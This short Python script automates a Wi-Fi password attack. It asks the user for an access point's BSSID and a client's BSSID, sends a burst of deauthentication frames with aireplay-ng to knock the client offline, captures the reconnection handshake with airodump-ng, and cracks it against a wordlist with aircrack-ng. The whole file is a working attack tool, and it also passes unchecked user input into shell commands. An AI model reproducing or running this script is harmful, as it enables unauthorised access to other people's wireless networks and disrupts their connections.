import os



os.system("cat firstdump.txt")

print("The Access Point BSSID can be found next to the name of the Wi-Fi\n")
print("The client BSSIDs are found under 'Station'")
print("They will be of the form: xx:xx:xx:xx:xx:xx\n")
print("Example BSSID: 00:0F:66:ED:B5:8A\n")
access_point = input("Access Point BSSID: ")
client = input("Client BSSID: ")
 

command = "sudo timeout --foreground 15 aireplay-ng -0 100 -a " + access_point + " -c " + client + " wlan0mon"
command = command + " & sudo timeout --foreground 15 airodump-ng --bssid " + access_point + " -w output wlan0mon"

os.system(command)

command = "sudo aircrack-ng -w dict.txt -b " + access_point + " output-01.cap"
os.system(command)
